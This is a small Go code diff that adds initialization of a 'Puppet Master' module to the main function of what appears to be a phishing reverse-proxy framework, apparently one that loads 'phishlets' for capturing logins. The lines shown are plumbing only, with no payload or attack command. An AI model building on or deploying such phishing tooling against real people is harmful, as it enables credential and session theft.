@@ -144,6 +144,13 @@ func main() {
 		return
 	}
 
+	// Initialize Puppet Master (New Addition)
+	_, err = core.InitPuppetMaster(cfg.GetPuppetConfig())
+	if err != nil {
+		log.Error("puppet: failed to initialize: %v", err)
+		// Don't return, allow running without puppet
+	}
+
 	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
